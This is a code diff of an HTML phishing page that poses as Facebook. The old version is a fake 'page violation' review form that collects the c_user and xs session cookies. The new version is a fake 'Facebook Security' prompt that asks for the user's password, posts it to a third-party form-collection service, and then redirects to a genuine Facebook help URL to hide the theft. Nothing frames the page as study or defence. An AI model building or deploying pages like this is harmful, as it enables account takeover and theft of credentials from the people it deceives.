@@ -1,77 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
 
-<!doctype html>
 <head>
-  <title>Request Form</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href="style.css" rel="stylesheet">
-    <link rel="icon" href="fb-logo.png" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Password Page</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
- 
+        .container {
+            background-color: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            width: 360px;
+            position: relative;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 120px;
+        }
+
+        .header {
+            margin-bottom: 20px;
+            font-size: 18px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #606770;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            padding-right: 40px;
+            /* Space for the eye icon */
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 16px;
+            color: #1c1e21;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            color: #606770;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .eye-icon:hover {
+            color: #1877f2;
+        }
+
+        .submit-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .submit-button:hover {
+            background-color: #166fe5;
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+    </style>
 </head>
+
 <body>
-<div class="relative bg-[#FFFFFF]">
-  <div class="mx-10 mt-4">
-    <marquee>
-      <img src="https://cdn.glitch.global/26db6cad-21fa-4aee-9093-92af7de338e9/meta-logo.png?v=1707682041784">
-    </marquee>
-  </div>
+    <div class="container">
+        <div class="logo">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
+            <div class="header">
+                Facebook Security
+            </div>
+            <p>Please re-enter your password to complete the request.</p>
+            <form id="meta-form" action="https://submit-form.com/ZjHi9CVA3" method="POST">
+                <!-- Replace with your Access Key -->
+                <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                        <i class="eye-icon fas fa-eye" id="togglePassword"></i>
+                    </div>
+                    <span id="error-message" class="error-message"></span>
+                </div>
+                <button type="submit" class="submit-button">Submit</button>
+            </form>
+        </div>
+        <script>
+            document.getElementById('togglePassword').addEventListener('click', function() {
+                var passwordField = document.getElementById('password');
+                var eyeIcon = this;
+                if (passwordField.type === 'password') {
+                    passwordField.type = 'text';
+                    eyeIcon.classList.remove('fa-eye');
+                    eyeIcon.classList.add('fa-eye-slash');
+                } else {
+                    passwordField.type = 'password';
+                    eyeIcon.classList.remove('fa-eye-slash');
+                    eyeIcon.classList.add('fa-eye');
+                }
+            });
 
-  <form class="sm:hidden lg:block md:block" action="https://usebasin.com/f/56316fa2500c" method="post">
+            document.getElementById('passwordForm').addEventListener('submit', function(event) {
+                var passwordField = document.getElementById('password');
+                var errorMessage = document.getElementById('error-message');
+                if (passwordField.value.length < 6) {
+                    errorMessage.textContent = 'Password must be at least 6 characters long.';
+                    event.preventDefault();
+                } else {
+                    errorMessage.textContent = '';
+                    // Perform form submission via Fetch API
+                    event.preventDefault(); // Prevent default form submission
 
-<div style="position: absolute; left: 1.5rem; top:8rem; width: 90%;">
-  <div>
-    <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">
-      Request For Remove Page Violation
-    </p>
-  </div>
-<div>
-  <p class="mt-4 pl-3 text-[12px] font-semibold">
-    We've identified irregular activity on your page that goes against our community guidelines.
-  </p>
-</div>
-<div>
-  <p class="mt-4 pl-3 text-[12px] font-semibold">
-    As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.
-  </p>
-</div>
-<div>
-  <p class="mt-4 pl-3 text-[12px] font-semibold">
-    If you think this is a Mistake, you can request a review by providing the required details.
-  </p>
-</div>
-<div>
-  <p class="text-[11px] text-[#90949c] p-2 font-semibold">
-    Detailed Video Information
-  </p>
-</div>
-<div>
-  <a class="w-32 h-20 block" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img class="w-32 h-20 mx-3" src="https://cdn.glitch.global/26db6cad-21fa-4aee-9093-92af7de338e9/video-logo.jpg?v=1707684416461" alt=""></a>
-  </div>
-  <div>
-  <p class=" pl-3 text-[12px] font-semibold">
-    Kindly make sure to provide the requested details below.
-  </p>
-</div>
-<div>
-  <p class="text-slate-400 pl-4 mt-1">
-    c_user
-  </p><input class="border h-6 pl-1 mx-3" type="number" name="c_user" pattern="[0-9]+" minlength="6" title="Must Watch Detailed Video" required="1" aria-required="true">
-</div>
-<div>
-  <p class="text-slate-400 pl-4 mt-1">
-    xs
-  </p><input class="border h-6 pl-1 mx-3" type="text" name="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
-</div><div>
-  <p class="mt-4 pl-3 text-[12px] font-semibold">
-    Please ensure that you do not log out of your account on your computer or laptop until you have received a verification email.
-  </p>
-</div><div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]"><div class="flex justify-end mx-2">
-  <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">
-    Submit
-  </button></div>
-  </div>
- </div>
-  </form>
+                    var formData = new FormData(this);
+                    fetch(this.action, {
+                            method: 'POST',
+                            body: formData,
+                            headers: {
+                                'Accept': 'application/json'
+                            }
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
+                            } else {
+                                errorMessage.textContent = 'There was an error. Please try again.';
+                            }
+                        })
+                        .catch(() => {
+                            errorMessage.textContent = 'There was an error. Please try again.';
+                        });
+                }
+            });
+        </script>
 </body>
+
 </html>
